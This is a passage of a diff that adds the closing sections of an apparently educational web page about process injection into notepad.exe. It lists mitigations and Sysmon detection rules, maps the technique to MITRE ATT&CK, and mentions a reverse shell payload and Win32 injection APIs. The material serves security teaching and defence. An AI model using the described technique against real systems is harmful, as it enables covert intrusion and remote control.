+            <p>DEP marks non-code memory regions as non-executable. While this demo uses <code>PAGE_EXECUTE_READWRITE</code> to bypass it, DEP still raises the bar for less sophisticated attackers.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Enable Control Flow Guard (CFG)</strong>
+            <p>CFG validates that indirect function calls — like the thread entry point in <code>CreateRemoteThread</code> — jump to known valid code locations. Shellcode at an arbitrary allocated address would fail CFG validation.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Deploy Sysmon with detection rules</strong>
+            <p>Configure Sysmon to log Event ID 8 (CreateRemoteThread) and Event ID 10 (ProcessAccess with <code>PROCESS_ALL_ACCESS</code>). Forward to SIEM and alert on these events from unusual callers.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Principle of least privilege</strong>
+            <p>Running processes with minimum necessary privileges makes it harder to obtain <code>PROCESS_ALL_ACCESS</code> on higher-privileged targets. UAC and PAM both help limit the blast radius.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Monitor for unusual network connections</strong>
+            <p>Alert on outbound network connections from processes that should never make network calls — like <code>notepad.exe</code> connecting to port 4444. This is the most obvious post-injection signal.</p>
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <!-- MITRE -->
+    <section id="mitre">
+      <div class="section-header">
+        <span class="step-badge">11</span>
+        <h2>MITRE ATT&amp;CK Mapping</h2>
+      </div>
+
+      <table>
+        <thead>
+          <tr><th>Technique ID</th><th>Technique</th><th>How it applies</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><span class="mitre-tag">T1055</span></td><td>Process Injection</td><td>Core technique — injecting shellcode into notepad.exe</td></tr>
+          <tr><td><span class="mitre-tag">T1055.002</span></td><td>Portable Executable Injection</td><td>Writing position-independent shellcode into remote process memory</td></tr>
+          <tr><td><span class="mitre-tag">T1057</span></td><td>Process Discovery</td><td>CreateToolhelp32Snapshot enumerating all running processes</td></tr>
+          <tr><td><span class="mitre-tag">T1082</span></td><td>System Information Discovery</td><td>Process enumeration reveals system state and running applications</td></tr>
+          <tr><td><span class="mitre-tag">T1036</span></td><td>Masquerading</td><td>Malicious activity appears to originate from legitimate notepad.exe</td></tr>
+          <tr><td><span class="mitre-tag">T1106</span></td><td>Native API</td><td>Direct Win32 API calls — VirtualAllocEx, WriteProcessMemory, CreateRemoteThread</td></tr>
+          <tr><td><span class="mitre-tag">T1059</span></td><td>Command and Scripting Interpreter</td><td>Reverse shell payload executes commands inside notepad context</td></tr>
+          <tr><td><span class="mitre-tag">TA0005</span></td><td>Defense Evasion</td><td>Primary tactic — injecting into trusted process to evade detection</td></tr>
+          <tr><td><span class="mitre-tag">TA0004</span></td><td>Privilege Escalation</td><td>Can escalate if injecting into a higher-privileged process</td></tr>
+        </tbody>
+      </table>
+
+      <div class="callout info">
+        <span class="callout-icon">📚</span>
+        <p><strong>Further reading.</strong> MITRE ATT&amp;CK T1055 
+documents process injection with sub-techniques covering DLL injection, 
+portable executable injection, thread hijacking, and more: <a href="https://attack.mitre.org/techniques/T1055/" style="color: var(--accent);">attack.mitre.org/techniques/T1055 ↗</a></p>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer>
+  <p>Educational security research &nbsp;·&nbsp; <a href="https://github.com/Cupcakeatemytaser/Process_Injection_Demo">View source on GitHub ↗</a> &nbsp;·&nbsp; <a href="file:///C:/Users/REM/AppData/Local/Temp/vmware-REM/VMwareDnD/83e9d156/index.html">← Back to blog</a></p>
+</footer>
+
+<script>
+  const sections = document.querySelectorAll('section');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.05 });
+  sections.forEach(s => observer.observe(s));
+
+  const navLinks = document.querySelectorAll('.sidebar nav a');
+  const sectionObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        navLinks.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`.sidebar nav a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { threshold: 0.4 });
+  sections.forEach(s => sectionObserver.observe(s));
+</script>
+
+
+
+</body></html>
